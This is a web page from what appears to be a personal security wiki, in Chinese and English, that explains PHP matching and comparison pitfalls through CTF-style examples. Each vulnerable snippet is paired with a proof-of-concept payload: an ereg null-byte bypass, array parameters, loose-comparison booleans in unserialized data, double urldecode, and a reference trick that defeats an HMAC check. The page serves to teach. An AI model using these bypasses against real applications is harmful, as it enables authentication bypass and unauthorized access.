<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>php match or comapre - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;php match or comapre</div>
</div>
<div class="clearfix"></div>
<div id="title">php match or comapre</div>
  <div id="content">
  <h1 id="match">match</h1>
<h2 id="ereg">ereg</h2>
<blockquote>
<p>int ereg() 返回整数类型</p>
</blockquote>
<ul>
<li>example</li>
</ul>
<div class="hlcode"><pre><span class="x">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE){</span>
<span class="x">    echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;</span>
<span class="x">}</span>
<span class="x">else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999){</span>
<span class="x">    if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE){</span>
<span class="x">        die(&#39;Flag: &#39; . $flag);</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<ul>
<li>poc 1</li>
</ul>
<div class="hlcode"><pre><span class="nl">url:</span> <span class="p">...</span><span class="o">?</span><span class="n">password</span><span class="o">=</span><span class="mf">1e9</span><span class="o">%</span><span class="mo">00</span><span class="o">*-*</span>
</pre></div>


<p>此处利用 <strong>ereg 经典漏洞</strong>，读到 <strong> %00 </strong> 就截止了</p>
<ul>
<li>poc 2</li>
</ul>
<div class="hlcode"><pre><span class="nl">url:</span> <span class="p">...</span><span class="o">?</span><span class="n">password</span><span class="p">[]</span><span class="o">=</span><span class="n">s</span>
</pre></div>


<p><strong>传入数组</strong></p>
<ul>
<li>ereg 返回<strong> NULL</strong> ，NULL !== FALSE is true</li>
<li>strpos 处理数组，也返回 <strong> NULL </strong></li>
<li>strlen 处理数组，同样返回 <strong>NULL</strong></li>
</ul>
<p><strong>比较</strong></p>
<ul>
<li>null 和 任何其他任何类型，比较，转换为 bool， FALSE &lt; TRUE</li>
<li>array 和  任何其他类型（不包括 object）， 比较， array 总是更大</li>
</ul>
<h2 id="loose-comparison-operator">loose comparison(== operator)</h2>
<ul>
<li>example</li>
</ul>
<div class="hlcode"><pre><span class="x">$flag=&#39;ctf_flag&#39;;</span>
<span class="x">$unserialize_str = $_POST[&#39;password&#39;];</span>
<span class="x">$data_unserialize = unserialize($unserialize_str);</span>
<span class="x">if($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]==&#39;???&#39;)</span>
<span class="x">{</span>
<span class="x">    print_r($flag);</span>
<span class="x">}</span>
</pre></div>


<p>user, pass 的值是未知的，条件判断时使 $data_unserialize['user']=true ， $data_unserialize['pass']=true 即可</p>
<ul>
<li>poc</li>
</ul>
<p>'''php
$arr =  array();
$arr['user']=TRUE;
$arr['pass']=TRUE;
$seialize_str = serialize($arr);    //a:2:{s:4:"user";b:1;s:4:"pass";b:1;}
$flag='ctf_flag';
$data_unserialize = unserialize($serialize_str);
if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???')
{
    print_r($flag);
}
'''</p>
<h2 id="urldecode">urldecode</h2>
<blockquote>
<p>string urldecode() 返回字符串类型 </p>
</blockquote>
<p>urldecode 与 $_GET[] $_POST[] $_REQEST[] 联合使用
$_GET[] $_POST[] $_REQEST[] 返回的参数是<strong>已经被解码了</strong>的，在进行 urldecode 相当于 二次 urldecode</p>
<ul>
<li>poc</li>
</ul>
<p>'''php
$username = $_GET['username'];  //url: ...?username=%2561dmin   %61 is a
if (urldecode($username) === "admin"){
    echo "you are admin";
}
'''</p>
<h2 id="reference">reference</h2>
<ul>
<li>example</li>
</ul>
<p>'''php
$auth = $_COOKIE['auth'];
if(get_magic_quotes_gpc())
    $auth = stripslashes($auth);
$auth = unserialize($auth);</p>
<p>if(!is_array($auth))    // hint auth is array
    return false;</p>
<p>$auth['hmac_t'] = sha1(sha1($auth['username'].$auth['hmac_t'].$auth['password']).$secret_salt);</p>
<p>if($auth['hmac_t'] !== $auth['hmac'])
    return false;
'''</p>
<ul>
<li>poc</li>
</ul>
<p>'''php
$a = array("username" =&gt; "dragon", "password" =&gt; true, "hmac_t" =&gt; "0"); 
$a["hmac"] = &amp;$a["hmac_t"]; // key point <strong><em>*</em></strong><strong><em>*</em></strong>**
$a["hmac_t"]=1; 
echo $a["hmac"]."\n";
echo urlencode(serialize($a)) . "\n";
'''</p>
<p>1.<strong>PHP 是可以直接取 Reference </strong>
则 if !== 的 strict comparison 就 always true 了...因为都是一个<strong> Object </strong>
2.cookie 提交 auth 为 urlencode(serialize($a)) 或 serialize($a) 均可 </p>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>